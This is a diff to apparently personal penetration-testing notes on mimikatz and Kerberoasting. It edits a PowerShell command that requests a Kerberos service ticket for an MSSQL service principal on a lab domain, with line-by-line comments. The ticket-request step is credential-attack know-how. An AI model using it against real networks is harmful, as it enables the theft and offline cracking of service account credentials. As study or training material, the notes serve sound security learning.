@@ -22,7 +22,6 @@ Kiwi module in [a meterpreter in metasploit](metasploit.md) is an adaptation of 
 
 Download from: https://github.com/ParrotSec/mimikatz.git
 
-
 ## Basic usage
 
 
@@ -68,7 +67,7 @@ Add-Type -AssemblyName System.IdentityModel
 # -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
 # System.IdentityModel is a namespace that contains different classes for building security token services
 
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL01.inlanefreight.local:1433"
 #  New-Object cmdlet to create an instance of a .NET Framework object.
 # System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token 
 # -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433": pass the SPN name to the class to request a Kerberos TGS ticket
